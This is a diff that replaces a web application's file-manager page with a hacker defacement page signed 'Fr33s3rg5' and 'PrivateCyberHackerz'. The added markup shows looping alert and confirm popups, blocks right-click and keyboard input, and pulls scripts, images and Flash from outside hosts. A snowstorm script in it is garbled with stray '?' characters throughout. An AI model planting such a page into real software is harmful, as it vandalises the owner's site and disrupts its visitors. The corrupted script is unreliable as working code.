@@ -1,126 +1,529 @@
-<!DOCTYPE html>
-<html>
-<head>
-    <meta http-equiv="content-type" content="text/html; charset=utf-8"/>
-    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<script language="JavaScript">
 
-    <!-- Standard CSS -->
-    <link rel="stylesheet" href="../css/themes/df-default/jquery-ui-1.9.1.custom.css" type="text/css" />
-    <link rel="stylesheet" href="../css/layout.css" type="text/css"/>
-    <link rel="stylesheet" href="/lib/web-core/css/bootstrap.min.css" type="text/css"/>
-    <link rel="stylesheet" href="/lib/web-core/css/font-awesome.min.css" type="text/css"/>
-    <link rel="stylesheet" href="css/base.css" type="text/css"/>
 
-    <script src="/lib/web-core/js/jquery.js"></script>
-    <script src="/lib/web-core/js/jquery-ui-1.9.2.custom.min.js"></script>
+function tb5_makeArray(n){
+this.length = n;
+return this.length;
+}
 
-    <!-- DF Imports -->
-    <script src="/lib/web-core/js/df.js"></script>
-    <script src="/lib/web-core/js/utils.js"></script>
-    <script src="/lib/web-core/js/bootstrap.min.js"></script>
+tb5_messages = new tb5_makeArray(5);
+tb5_messages[0] = "You got Hacked By Fr33s3rg5";
+tb5_messages[1] = "We are PrivateCyberHackerz";
+tb5_messages[2] = "We Love Hacking!";
+tb5_messages[3] = "We Can Do Everything";
+tb5_messages[4] = "For Our Country !";
+tb5_messages[5] = "Don't worry! your all data base is safe!";
+tb5_messages[6] = "We just Inform your site's security is too low";
+tb5_messages[7] = "Fixed it as soon possible, else others hacker hacked your systems!";
+tb5_rptType = 'infinite';
+tb5_rptNbr = 10;
+tb5_speed = 50;
+tb5_delay = 2000;
 
-    <!-- DF FileManager -->
-    <script src="js/filemanagement.js"></script>
+var tb5_counter=1;
+var tb5_currMsg=0;
+var tb5_stsmsg="";
+function tb5_shuffle(arr){
+var k;
+for (i=0; i<arr.length; i++){
+k = Math.round(Math.random() * (arr.length - i - 1)) + i;
+temp = arr[i];arr[i]=arr[k];arr[k]=temp;
+}
+return arr;
+}
+tb5_arr = new tb5_makeArray(tb5_messages[tb5_currMsg].length);
+tb5_sts = new tb5_makeArray(tb5_messages[tb5_currMsg].length);
+for (var i=0; i<tb5_messages[tb5_currMsg].length; i++){
+tb5_arr[i] = i;
+tb5_sts[i] = "_";
+}
+tb5_arr = tb5_shuffle(tb5_arr);
+function tb5_init(n){
+var k;
+if (n == tb5_arr.length){
+if (tb5_currMsg == tb5_messages.length-1){
+if ((tb5_rptType == 'finite') && (tb5_counter==tb5_rptNbr)){
+clearTimeout(tb5_timerID);
+return;
+}
+tb5_counter++;
+tb5_currMsg=0;
+}
+else{
+tb5_currMsg++;
+}
+n=0;
+tb5_arr = new tb5_makeArray(tb5_messages[tb5_currMsg].length);
+tb5_sts = new tb5_makeArray(tb5_messages[tb5_currMsg].length);
+for (var i=0; i<tb5_messages[tb5_currMsg].length; i++){
+tb5_arr[i] = i;
+tb5_sts[i] = "_";
+}
+tb5_arr = tb5_shuffle(tb5_arr);
+tb5_sp=tb5_delay;
+}
+else{
+tb5_sp=tb5_speed;
+k = tb5_arr[n];
+tb5_sts[k] = tb5_messages[tb5_currMsg].charAt(k);
+tb5_stsmsg = "Hacked By Fr33s3rg5";
+for (var i=0; i<tb5_sts.length; i++)
+tb5_stsmsg += tb5_sts[i];
+document.title = tb5_stsmsg;
+n++;
+}
+tb5_timerID = setTimeout("tb5_init("+n+")", tb5_sp);
+}
+function tb5_randomizetitle(){
+tb5_init(0);
+}
+tb5_randomizetitle();
 
+//-->
+</script>
+
+
+<html><head>
+
+
+<meta http-equiv="content-type" content="text/html; charset=UTF-8"><title>
+Fr33s3rg5 Here ;)</title>
+<meta name="keywords" content="Hacked by Fr33s3rg5 "> <script type="text/javascript">
+
+
+
+
+</script><script type="text/javascript" src="%7BCoNtrollEd%20bY%20Death%7D_files/cloudflare.js"></script><script data-module="cloudflare/rocket" id="cfjs_block_95dc9d530f" onload="CloudFlare.__cfjs_block_95dc9d530f_load()" onerror="CloudFlare.__cfjs_block_95dc9d530f_error()" onreadystatechange="CloudFlare.__cfjs_block_95dc9d530f_readystatechange()" type="text/javascript" src="%7BCoNtrollEd%20bY%20Death%7D_files/rocket.htm"></script>
 </head>
+<body oncontextmenu="return false;" onkeydown="return false;" onload="(function(a){window.CloudFlare &amp;&amp; window.CloudFlare.push(function(b){b([&quot;cloudflare/rocket&quot;],function(c){c.push(function(){(function(){confirm('.::Your Website Has Been CoNtrollEd!::.');}).call(a)})})})})(this);" onunload="confirm('.::I will be Comeback::.');"><center>
+
+
+
+</center>
+
+<center><h1 align="center"> <font color="#bb151a" face= "STENCIL" style="font-size: 30pt>PrivateCyberHackerz</h1></center>
+<center><font face="Georgia" color="#FF0000" "></center></font><span style="font-size: 16pt"><br>
+        </span><font face="Tahoma"><span style="font-size: 10pt">
+       
+        <p align="center"><font color="#00ff00" face="Arial Black"
+</font></b></p><center> <img src="http://i.imgur.com/Gn4rnnp.png"></center>
+<center><img src="http://i.imgur.com/NrALn.gif?1"></center></br>
+       
+        <center><embed width="700" height="40" align="middle" pluginspage="" type="application/x-shockwave-flash" wmode="transparent" quality="high" src="http://www.widgeo.net/effets/2.swf" flashvars="letter=Fr33s3rg5"></center>
+
+
+<param value="transparent" name="wmode"><param value="always"
+name="allowscriptaccess"><param
+value="logfn=_GPL.items.e6a00.log&amp;onload=_GPL.items.e6a00.onload&amp;onerror=_GPL.items.e6a00.onerror&amp;LSOName=gpl"
+name="flashvars"></object>
+
+        <font face="Verdana" color="#FFFFFF" style="font-size: 11pt"><br>
+</font>
+
+
+  <script>alert("Hacked by Fr33s3rg5");</script>
+<script>alert("I warning you but you're not Listening");</script>
+  <script>alert("PATCH YOUR SITE !!");</script>
+
+       
+        <center><font face="Orbitron" color="#ff0000"><br>
+<span style="font-weight:bold; text-shadow:red 0px 0px 8px; color:red">  "Power that can't be Imagined,<br>  Strength that can't be Compared.<br> On the way of Justice,<br> With the path of Honesty.<br> We are Hackerz"</br> </center> <font color="#D3D3D3" size="2" face="Tahoma"><strong> </strong></font></p>
+<p align="center"><font color="#666666" size="2" face="Courier New"><strong></strong></font></p>
+<p align="center"><font color="#0000bf" size="2" face="Tahoma"><strong><font color="#D3D3D3" size="2" face="Tahoma"><strong></strong></font></p>
+<p align="center"><font color="#00e6ea" size="2" face="Orbitron"><strong><strong>
+
+<marquee behavior="scroll" direction="left" scrollamount="100" scrolldelay="40" width="100%"> _____________________________________ </marquee>
+<marquee behavior="scroll" direction="right" scrollamount="100" scrolldelay="40" width="100%"> _____________________________________ </marquee> 
+</script> THIS TIME TO REBOOT YOUR COUNTRY . <strong></strong></font></p>
+
+       
+<head><script type="text/javascript">
+
+</script>
+
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+<title>Fr33s3rg5</title>
+
+<style type="text/css">
+<!--
+body {
+        background-color: #000000;
+}
+body,td,th {
+        color: #696969;
+        font-family: Georgia,courier, helvetica, sans serif;
+}
+.style3 {
+        font-family: tahoma;
+        color: #FFFFFF;
+        font-size: 14px;
+}
+.style5 {
+        font-family: tahoma;
+        color: #FF0000;
+        font-size: 24px;
+        font-weight: bold;
+}
+.style6 {
+        color: #FFFFFF;
+        font-family: tahoma;
+        font-size: 12px;
+}
+-->
+
+<!--
+a{text-decoration:none}
+//-->
+</style></head>
+
 <body>
-<div id="fileModal" class="modal hide fade in" style="display: none; ">
-    <div class="modal-header">
-        <a class="close" data-dismiss="modal">&times;</a>
 
-        <h3>Upload File</h3>
-    </div>
-    <div class="modal-body">
-        <div class="alert">Use the controls below to upload a file to the application.</div>
-        <p>
 
-        <div class="btn-group" data-toggle="buttons-radio">
-            <a href="#" type="button" id="file-btn" class="btn btn-primary" name="File"
-               onclick="setMode('file')">File</a>
-            <a href="#" type="button" id="url-btn" class="btn" name="URL" onclick="setMode('url');">URL</a>
-        </div>
-        </p
-        <p>
 
-        <form id="fileImportForm" method="POST" enctype="multipart/form-data" target="fileIframe">
-            <input id="fileInput" type="file" name="files" size="50"></input>
-        </form>
-        <iframe id="fileIframe" style="display: none;" name="fileIframe" src="about:blank" onload="checkResults(this)"></iframe>
-        <div id="errorDialog" style="display: none;" title="Oops! An Error Has Occured..." class="cTxtLeft">
-            <p class="ui-state-error ui-corner-all cP1">
-                <span class="ui-icon ui-icon-alert" style="float: left; margin-right: .3em;"></span>
-                <span id="errorMsg"><!--  --></span>
-            </p>
-        </div>
-        </p>
-        <p>
-            <input id="urlImportText" style="display: none;" type="text" class="input-xlarge" placeholder="Enter a url"
-                   value="">
-        </p>
 
-        <p>
-            <input id="importExtract" type="checkbox">Extract ZIP files</input>
-        </p>
+<div align="center">
+  <p><br/>
 
-        <p>
-            <input id="importReplace" type="checkbox">Delete existing folder contents before extracting</input>
-        </p>
-    </div>
-    <div class="modal-footer">
-        <a href="#" class="btn" data-dismiss="modal">Cancel</a>
-        <a href="#" class="btn btn-primary" onclick="importFile()">Import</a>
-    </div>
-</div>
-<div id="main_content" align="left">
-    <div id="fileManagerPanel">
-        <div align="left" class="cH100 ui-widget ui-state-default ui-corner-all ">
-            <div class="cTM1" align="left">
-                <div id="browserControl">
-                    <div class="cRight fmToolbar cRM1">
-								<span id="mandatory_tools">
-                                   <div class="btn-toolbar">
-                                       <div class="btn-group">
-                                           <a id="mkdir" href="#" class="btn btn-small fmActionButton"><i
-                                                   class="icon-folder-close"></i>&nbsp;Create Folder</a>&nbsp;
-                                           <a id="importfile" href="#" class="btn btn-small fmActionButton"><i
-                                                   class="icon-cloud-upload"></i>&nbsp;Upload File</a>&nbsp;
-                                           <a id="exportzip" href="#" class="btn btn-small fmActionButton"><i
-                                                   class="icon-cloud-download"></i>&nbsp;Download Zip</a>&nbsp;
-                                           <a id="rm" href="#" class="btn btn-small fmActionButton"><i
-                                                   class="icon-trash"></i>&nbsp;Delete Item(s)</a>
-                                       </div>
-                                   </div>
-								</span>
-                    </div>
-                    <div class="cLeft cLM1 fmToolbarPlus3">
-                        <a id="home" href="#" class="btn btn-small fmActionButton"><i
-                                class="icon-home"></i>&nbsp;Home</a>&nbsp;
-                        PATH:&nbsp;<span id="breadcrumbs">/</span>
-                    </div>
-                    <div class="cClear"><!--  --></div>
-                </div>
-                <div id="fileControl">
-                    <div class="cRight fmToolbar">
-								<span id="fileControl_mandatory_tools">
-									<button id="exitEditor">Close Editor</button>
-								</span>
-                    </div>
-                    <strong>EDITING&nbsp;FILE:</strong> <span id="fileControl_breadcrumbs">/</span>
-                </div>
-            </div>
-            <div id="dndPanel" data-target="" data-type="folder" align="left" style="background: #fff;"
-                 class="cCenter cW98 cH90 ui-widget ui-state-default ui-corner-all">
-                <div id="listing" class="scrollablePane cH95 cW98">
+       
+  <span class="style5">
+        <span class="style3">
 
-                </div>
-            </div>
-            <div id="editPanel" data-target="" data-type="folder" align="left" class="cCenter cW98 cH90">
-                <iframe id="editing" width="100%" height="100%" src="about:blank"
-                        class="ui-widget ui-state-default ui-corner-all"></iframe>
-            </div>
-        </div>
-        <div class="cClear"></div>
-    </div>
-</div>
-</body>
-</html>
+</font></b></p>
+
+<font style="font-size: 8pt;" face="Impact" size="3">
+          <script type="text/javascript">/*Important Function to blend the tabs in and out*/
+function blendoff(idname) {document.getElementById(idname).style.display
+= 'none';}
+function blendon(idname) {document.getElementById(idname).style.display
+= 'block';}</script>
+          <script type="text/javascript">/*Function for our Tabmenu with 4 Tabs*/
+function swichtabs(wert) {
+if (wert=='1'){
+document.getElementById('tablink1').className='tab1 tabactive';
+document.getElementById('tablink2').className='tab2';
+document.getElementById('tablink3').className='tab3';
+document.getElementById('tablink4').className='tab4';
+}else if (wert=='2'){
+document.getElementById('tablink1').className='tab1';
+document.getElementById('tablink2').className='tab2 tabactive';
+document.getElementById('tablink3').className='tab3';
+document.getElementById('tablink4').className='tab4';
+}else if (wert=='3'){
+document.getElementById('tablink1').className='tab1';
+document.getElementById('tablink2').className='tab2';
+document.getElementById('tablink3').className='tab3 tabactive';
+document.getElementById('tablink4').className='tab4';
+} else if (wert=='4'){
+document.getElementById('tablink1').className='tab1';
+document.getElementById('tablink2').className='tab2';
+document.getElementById('tablink3').className='tab3';
+document.getElementById('tablink4').className='tab4 tabactive';
+}
+         
+
+</script>
+
+<br>
+ 
+<div align="center"><img src="http://sarbaz-faz.persiangig.com/Hack/hacked.gif"></div>
+ 
+</br>
+          
+     
+  <style type="text/css">
+    /* Circle Text Styles */
+    #outerCircleText {
+    /* Optional - Becareful of us. */
+    font-style: italic;
+    font-weight: bold;
+    font-family: 'comic sans ms', verdana, arial;
+    color: #FFF;
+    /* End Optional */
+     
+    /* Start Required - Do Not Edit */
+    position: absolute;top: 0;left: 0;z-index: 3000;cursor: default;}
+    #outerCircleText div {position: relative;}
+    #outerCircleText div div {position: absolute;top: 0;left: 0;text-align: center;}
+    /* End Required */
+    /* End Circle Text Styles */
+          </style>
+     <script type="text/javascript">
+    ;(function(){      
+    var msg = "Hacked by Fr33s3rg5";
+    var size = 24;
+    var circleY = 0.75; var circleX = 2;
+    var letter_spacing = 5;
+    var diameter = 10;
+    var rotation = 0.4;
+    var speed = 0.3;    
+    ////////////////////// Stop Editing //////////////////////    
+    if (!window.addEventListener && !window.attachEvent || !document.createElement) return;    
+    msg = msg.split('');
+    var n = msg.length - 1, a = Math.round(size * diameter * 0.208333), currStep = 20,
+    ymouse = a * circleY + 20, xmouse = a * circleX + 20, y = [], x = [], Y = [], X = [],
+    o = document.createElement('div'), oi = document.createElement('div'),
+    b = document.compatMode && document.compatMode != "BackCompat"? document.documentElement : document.body,    
+    mouse = function(e){
+     e = e || window.event;
+     ymouse = !isNaN(e.pageY)? e.pageY : e.clientY; // y-position
+     xmouse = !isNaN(e.pageX)? e.pageX : e.clientX; // x-position
+    },  
+    makecircle = function(){ // rotation/positioning
+     if(init.nopy){
+      o.style.top = (b || document.body).scrollTop + 'px';
+      o.style.left = (b || document.body).scrollLeft + 'px';
+     };
+     currStep -= rotation;
+     for (var d, i = n; i > -1; --i){ // makes the circle
+      d = document.getElementById('iemsg' + i).style;
+      d.top = Math.round(y[i] + a * Math.sin((currStep + i) / letter_spacing) * circleY - 15) + 'px';
+      d.left = Math.round(x[i] + a * Math.cos((currStep + i) / letter_spacing) * circleX) + 'px';
+     };
+    },    
+    drag = function(){ // makes the resistance
+     y[0] = Y[0] += (ymouse - Y[0]) * speed;
+     x[0] = X[0] += (xmouse - 20 - X[0]) * speed;
+     for (var i = n; i > 0; --i){
+      y[i] = Y[i] += (y[i-1] - Y[i]) * speed;
+      x[i] = X[i] += (x[i-1] - X[i]) * speed;
+     };
+     makecircle();
+    },    
+    init = function(){ // appends message divs, & sets initial values for positioning arrays
+     if(!isNaN(window.pageYOffset)){
+      ymouse += window.pageYOffset;
+      xmouse += window.pageXOffset;
+     } else init.nopy = true;
+     for (var d, i = n; i > -1; --i){
+      d = document.createElement('div'); d.id = 'iemsg' + i;
+      d.style.height = d.style.width = a + 'px';
+      d.appendChild(document.createTextNode(msg[i]));
+      oi.appendChild(d); y[i] = x[i] = Y[i] = X[i] = 0;
+     };
+     o.appendChild(oi); document.body.appendChild(o);
+     setInterval(drag, 25);
+    },    
+    ascroll = function(){
+     ymouse += window.pageYOffset;
+     xmouse += window.pageXOffset;
+     window.removeEventListener('scroll', ascroll, false);
+    };
+     
+    o.id = 'outerCircleText'; o.style.fontSize = size + 'px';    
+    if (window.addEventListener){
+     window.addEventListener('load', init, false);
+     document.addEventListener('mouseover', mouse, false);
+     document.addEventListener('mousemove', mouse, false);
+      if (/Apple/.test(navigator.vendor))
+       window.addEventListener('scroll', ascroll, false);
+    }
+    else if (window.attachEvent){
+     window.attachEvent('onload', init);
+     document.attachEvent('onmousemove', mouse);
+    };    
+    })();    
+          </script>
+
+                        
+
+<script style="display: none;">        
+    <!--        
+        var snowStorm=(function(window,document){this.autoStart=true;this.flakesMax=128;this?.flakesMaxActive=64;this.animationInterval=33;this.excludeMobile=true;this.flake?Bottom=null;this.followMouse=true;this.snowColor='#fff';this.snowCharacter='&bull;';this.snowStick=true;this.targetElement=null;this.useMeltEffect=true;t?his.useTwinkleEffect=false;//
+        this.usePositionFixed=false;this.freezeOnBlur=true;this.flakeLeftOffset=0;t?his.flakeRightOffset=0;this.flakeWidth=8;this.flakeHeight=8;this.vMaxX=5;this.vM?axY=4;this.zIndex=0;var s=this,storm=this,i,isIE=navigator.userAgent.match(/msie/i),isIE6=navigator.userAgent.match(/msie 6/i),isWin98=navigator.appVersion.match(/windows 98/i),isMobile=navigator.userAgent.match(/mobile|opera m(ob|in)/i),isBackCompatIE=(isIE&&document.compatMode==='BackCompat'),noFixed=(isMobile||isBackCompatIE||isIE6?),screenX=null,screenX2=null,screenY=null,scrollY=null,vRndX=null,vRndY=null,win?dOffset=1,windMultiplier=2,flakeTypes=6,fixedForEverything=false,opacitySupporte?d=(function(){try{document.createElement('div').style.opacity='0.5';}catch(e){re?turn false;}
+        return true;}()),didInit=false,docFrag=document.createDocumentFragment();this.timers=[];this.flakes=[];this.disabled=false;this.active=false;this.meltFrameCount=20;this.meltFrames=[];this.events=(function(){var old=(!window.addEventListener&&window.attachEvent),slice=Array.prototype.slice,evt={add:(old?'attachEvent':?'addEventListener'),remove:(old?'detachEvent':'removeEventListener')};function getArgs(oArgs){var args=slice.call(oArgs),len=args.length;if(old){args[1]='on'+args[1];if(len>3){args.pop();}}else if(len===3){args.push(false);}
+        return args;}
+        function apply(args,sType){var element=args.shift(),method=[evt[sType]];if(old){element[method](args[0],args[1]);}else{element[method].apply(element,args);}}
+        function addEvent(){apply(getArgs(arguments),'add');}
+        function removeEvent(){apply(getArgs(arguments),'remove');}
+        return{add:addEvent,remove:removeEvent};}());function rnd(n,min){if(isNaN(min)){min=0;}
+        return(Math.random()*n)+min;}
+        function plusMinus(n){return(parseInt(rnd(2),10)===1?n*-1:n);}
+        this.randomizeWind=function(){var i;vRndX=plusMinus(rnd(s.vMaxX,0.2));vRndY=rnd(s.vMaxY,0.2);if(this.flakes){for(i?=0;i<this.flakes.length;i++){if(this.flakes[i].active){this.flakes[i].setVelocities();}}}};this.scrollHandler=function(){var i;scrollY=(s.flakeBottom?0:parseInt(window.scrollY||document.documentElement.scr?ollTop||document.body.scrollTop,10));if(isNaN(scrollY)){scrollY=0;}
+        if(!fixedForEverything&&!s.flakeBottom&&s.flakes){for(i=s.flakes.length;i--;){if(s.flakes[i].active===0){s.flakes[i].stick();}}}};this.resizeHandler=function(){if(window.innerWidth||window.innerHe?ight){screenX=window.innerWidth-16-s.flakeRightOffset;screenY=(s.flakeBottom?s.flakeBottom:window.innerHeight);}els?e{screenX=(document.documentElement.clientWidth||document.body.clientWidth||docu?ment.body.scrollWidth)-(!isIE?8:0)-s.flakeRightOffset;screenY=s.flakeBottom?s.flakeBottom:(document.documentElement?.clientHeight||document.body.clientHeight||document.body.scrollHeight);}
+        screenX2=parseInt(screenX/2,10);};this.resizeHandlerAlt=function(){screenX=s.targetElement.offsetLeft+s.ta?rgetElement.offsetWidth-s.flakeRightOffset;screenY=s.flakeBottom?s.flakeBottom:s.targetElement.offsetTop?+s.targetElement.offsetHeight;screenX2=parseInt(screenX/2,10);};this.freeze=function(){var i;if(!s.disabled){s.disabled=1;}else{return false;}
+        for(i=s.timers.length;i--;){clearInterval(s.timers[i]);}};this.resume=function(){if(s.disabled){s.disabled=0;}else{return false;}
+        s.timerInit();};this.toggleSnow=function(){if(!s.flakes.length){s.start();}?else{s.active=!s.active;if(s.active){s.show();s.resume();}else{s.stop();s.freeze?();}}};this.stop=function(){var i;this.freeze();for(i=this.flakes.length;i--;){this.flakes[i].o.style.display='none';}
+        s.events.remove(window,'scroll',s.scrollHandler);s.events.remove(window,'re?size',s.resizeHandler);if(s.freezeOnBlur){if(isIE){s.events.remove(document,'foc?usout',s.freeze);s.events.remove(document,'focusin',s.resume);}else{s.events.rem?ove(window,'blur',s.freeze);s.events.remove(window,'focus',s.resume);}}};this.sh?ow=function(){var i;for(i=this.flakes.length;i--;){this.flakes[i].o.style.display='block';}};this.SnowFlake=function(parent,type,x,y){var s=this,storm=parent;this.type=type;this.x=x||parseInt(rnd(screenX-20),10);this.y=(!isNaN(y)?y:-rnd(screenY)-12);this.vX=null;this.vY=null;this.vAmpTypes=[1,1.2,1.4,1.6,1.8];this.vAmp=this.vAmpTypes[this.type];this.melting=false;this.meltFrameCount=storm.meltFrameCount;this.meltFrames=sto?rm.meltFrames;this.meltFrame=0;this.twinkleFrame=0;this.active=1;this.fontSize=(?10+(this.type/5)*10);this.o=document.createElement('div');this.o.innerHTML=storm.snowCharacter?;this.o.style.color=storm.snowColor;this.o.style.position=(fixedForEverything?'f?ixed':'absolute');this.o.style.width=storm.flakeWidth+'px';this.o.style.height=s?torm.flakeHeight+'px';this.o.style.fontFamily='arial,verdana';this.o.style.curso?r='default';this.o.style.overflow='hidden';this.o.style.fontWeight='normal';this?.o.style.zIndex=storm.zIndex;docFrag.appendChild(this.o);this.refresh=function()?{if(isNaN(s.x)||isNaN(s.y)){return false;}
+        s.o.style.left=s.x+'px';s.o.style.top=s.y+'px';};this.stick=function(){if(n?oFixed||(storm.targetElement!==document.documentElement&&storm.targetElement!==document.body)){s.o.style.top=(screenY+scrollY-storm.flakeHeight)+'px';}else if(storm.flakeBottom){s.o.style.top=storm.flakeBottom+'px';}else{s.o.style.displ?ay='none';s.o.style.top='auto';s.o.style.bottom='0px';s.o.style.position='fixed'?;s.o.style.display='block';}};this.vCheck=function(){if(s.vX>=0&&s.vX<0.2){s.vX=0.2;}else if(s.vX<0&&s.vX>-0.2){s.vX=-0.2;}
+        if(s.vY>=0&&s.vY<0.2){
+        s.vY=0.2;}};this.move=function(){var vX=s.vX*windOffset,yDiff;s.x+=vX;s.y+=(s.vY*s.vAmp);if(s.x>=screenX||screenX-s.x<storm.flakeWidth){s.x=0;}else if(vX<0&&s.x-storm.flakeLeftOffset<-storm.flakeWidth){s.x=screenX-storm.flakeWidth-1;}
+        s.refresh();yDiff=screenY+scrollY-s.y;if(yDiff<storm.flakeHeight){s.active=0;if(storm.snowStick){s.stick();}else{s.recycle()?;}}else{if(storm.useMeltEffect&&s.active&&s.type<3&&!s.melting&&Math.random()>0.998){s.melting=true;s.melt();}
+        if(storm.useTwinkleEffect){if(!s.twinkleFrame){if(Math.random()>0.9){s.twinkleFrame=parseInt(Math.random()*20,10);}}else{s.twinkleFrame--;s.o.style.visibility=(s.twinkleFrame&&s.twinkleFrame%2===0?'hidden':'visible');}}}};this.animate=function(){s.move?();};this.setVelocities=function(){s.vX=vRndX+rnd(storm.vMaxX*0.12,0.1);s.vY=vRn?dY+rnd(storm.vMaxY*0.12,0.1);};this.setOpacity=function(o,opacity){if(!opacitySu?pported){return false;}
+        o.style.opacity=opacity;};this.melt=function(){if(!storm.useMeltEffect||!s.?melting){s.recycle();}else{if(s.meltFrame<s.meltFrameCount){s.setOpacity(s.o,s.meltFrames[s.meltFrame]);s.o.style.fontSize=s.fontSize-(s.fontSize*(s.meltFrame/s.meltFrameCount))+'px';s.o.style.lineHeight=storm.flakeHeight+2+(storm.flakeHei?ght*0.75*(s.meltFrame/s.meltFrameCount))+'px';s.meltFrame++;}else{s.recycle();}}};this.recycle=functio?n(){s.o.style.display='none';s.o.style.position=(fixedForEverything?'fixed':'abs?olute');s.o.style.bottom='auto';s.setVelocities();s.vCheck();s.meltFrame=0;s.mel?ting=false;s.setOpacity(s.o,1);s.o.style.padding='0px';s.o.style.margin='0px';s.?o.style.fontSize=s.fontSize+'px';s.o.style.lineHeight=(storm.flakeHeight+2)+'px'?;s.o.style.textAlign='center';s.o.style.verticalAlign='baseline';s.x=parseInt(rn?d(screenX-storm.flakeWidth-20),10);s.y=parseInt(rnd(screenY)*-1,10)-storm.flakeHeight;s.refresh();s.o.style.display='block';s.active=1;};this.recycl?e();this.refresh();};this.snow=function(){var active=0,used=0,waiting=0,flake=null,i;for(i=s.flakes.length;i--;){if(s.flakes[i].active===1){s.flakes[i].move();active++;}else if(s.flakes[i].active===0){used++;}else{waiting++;}
+        if(s.flakes[i].melting){s.flakes[i].melt();}}
+        if(active<s.flakesMaxActive){flake=s.flakes[parseInt(rnd(s.flakes.length),10)];if(flake.active===0){flake.melting=true;}}};this.mouseMove=function(e){if(!s.fo?llowMouse){return true;}
+        var x=parseInt(e.clientX,10);if(x<screenX2){windOffset=-windMultiplier+(x/screenX2*windMultiplier);}else{x-=screenX2;windOffset=(x/screenX2)*windMultiplier;}};this.createSnow=function(limit,allowInactive){var i;for(i=0;i<limit;i++){s.flakes[s.flakes.length]=new s.SnowFlake(s,parseInt(rnd(flakeTypes),10));if(allowInactive||i>s.flakesMaxActive){s.flakes[s.flakes.length-1].active=-1;}}
+        storm.targetElement.appendChild(docFrag);};this.timerInit=function(){s.time?rs=(!isWin98?[setInterval(s.snow,s.animationInterval)]:[setInterval(s.snow,s.animationInterval*3),setInterval(s.snow,s.animationInterval?)]);};this.init=function(){var i;for(i=0;i<s.meltFrameCount;i++){s.meltFrames.push(1-(i/s.meltFrameCount));}
+        s.randomizeWind();s.createSnow(s.flakesMax);s.events.add(window,'resize',s.?resizeHandler);s.events.add(window,'scroll',s.scrollHandler);if(s.freezeOnBlur){?if(isIE){s.events.add(document,'focusout',s.freeze);s.events.add(document,'focus?in',s.resume);}else{s.events.add(window,'blur',s.freeze);s.events.add(window,'fo?cus',s.resume);}}
+        s.resizeHandler();s.scrollHandler();if(s.followMouse){s.events.add(isIE?doc?ument:window,'mousemove',s.mouseMove);}
+        s.animationInterval=Math.max(20,s.animationInterval);s.timerInit();};this.s?tart=function(bFromOnLoad){if(!didInit){didInit=true;}else if(bFromOnLoad){return true;}
+        if(typeof s.targetElement==='string'){var targetID=s.targetElement;s.targetElement=document.getElementById(targetID);if(!s?.targetElement){throw new Error('Snowstorm: Unable to get targetElement "'+targetID+'"');}}
+        if(!s.targetElement){s.targetElement=(!isIE?(document.documentElement?docum?ent.documentElement:document.body):document.body);}
+        if(s.targetElement!==document.documentElement&&s.targetElement!==document.body){s.resizeHandler=s.resizeHandlerAlt;}
+        s.resizeHandler();s.usePositionFixed=(s.usePositionFixed&&!noFixed);fixedForEverything=s.usePositionFixed;if(screenX&&screenY&&!s.disabled){s.init();s.active=true;}};function doDelayedStart(){window.setTimeout(function(){s.start(true);},20);s.events.remov?e(isIE?document:window,'mousemove',doDelayedStart);}
+        function doStart(){if(!s.excludeMobile||!isMobile){if(s.freezeOnBlur){s.events.add(isIE?d?ocument:window,'mousemove',doDelayedStart);}else{doDelayedStart();}}
+        s.events.remove(window,'load',doStart);}
+        if(s.autoStart){s.events.add(window,'load',doStart,false);}
+        return this;}(window,document));        
+        //-->      
+        </script>
+      <!--//-->            
+        <script>
+        snowStorm.snowColor = '#FFFFFF'; // blue-ish snow!?
+        snowStorm.flakesMaxActive = 80;  // show more snow on screen at once
+        snowStorm.useTwinkleEffect = true;
+        snowStorm.snowCharacter = '?';
+        snowStorm.vMaxX = 10;
+        snowStorm.vMaxY = 10;
+        // let the snow flicker in and out of view
+        </script>
+          <script type="text/javascript">        
+                $(document).ready(function() {
+                        moveBgAround();
+                });
+               
+                function moveBgAround() {
+                        var x = Math.floor(Math.random()*600);
+                        var y = Math.floor(Math.random()*400);                      
+                        var time = Math.floor(Math.random()*1001) + 2000;              
+                        $('.scrollBg').animate({
+                                backgroundPosition: '(' + (x * -1) + 'px ' + (y * -1) + 'px)'
+                        }, time, "swing", function() {
+                                moveBgAround();
+                        });
+                }
+          </script>              
+                 
+                 
+
+
+
+
+<script src="http://onehackoranother.com/projects/jquery/jquery-grab-bag/javascripts/jquery.text-effects.js" type="text/javascript" language="javascript">
+Failed to load source for: http://onehackoranother.com/projects/jquery/jquery-grab-bag/javascripts/jquery.text-effects.js
+</script>
+
+  <script>
+        snowStorm.snowColor = '#FFFFFF'; // blue-ish snow!?
+        snowStorm.flakesMaxActive = 80;  // show more snow on screen at once
+        snowStorm.useTwinkleEffect = true;
+        snowStorm.snowCharacter = '?';
+        snowStorm.vMaxX = 10;
+        snowStorm.vMaxY = 10;
+        // let the snow flicker in and out of view
+        </script>
+          <script type="text/javascript">
+         
+                $(document).ready(function() {
+                        moveBgAround();
+                });
+               
+                function moveBgAround() {
+                        var x = Math.floor(Math.random()*600);
+                        var y = Math.floor(Math.random()*400);
+                       
+                        var time = Math.floor(Math.random()*1001) + 2000;
+               
+                        $('.scrollBg').animate({
+                                backgroundPosition: '(' + (x * -1) + 'px ' + (y * -1) + 'px)'
+                        }, time, "swing", function() {
+                                moveBgAround();
+                        });
+                }
+          </script>
+
+
+</strong></font></p>
+</font>
+
+       
+        <table class="code notranslate" align="center" bgcolor="#000000" border="5" cellpadding="0" cellspacing="0" height="5%" width="90%"><tbody><tr>
+
+  <td><marquee>
+
+    <font class="glow"><font color="#00ff00" face="tahoma"><b>Your website has been hacked by </b><b></font><b><font color="red">Fr33s3rg5</b></font><b><font color="green"></b></font><font color="pink"> </font><font color="Blue"></b></font><font color="#00ff00" face="tahoma"><b>We Are Legion , We Are Anonymous , Always EXPECT US !!!</b>
+
+   </font></font>
+
+  </marquee></td></tr></tbody></table>
+<br><br>
+
+<center><b><font class="wglow" color="Yellow" face="tahoma">WE ARE ANONYMOUS:</font></b></center>
+         
+         
+        <marquee>
+<span style="font-weight:bold; text-shadow:RED 0px 0px 8px; color:RED">
+         
+        <font class="whiteglow" face="tahoma"> | </font>
+         
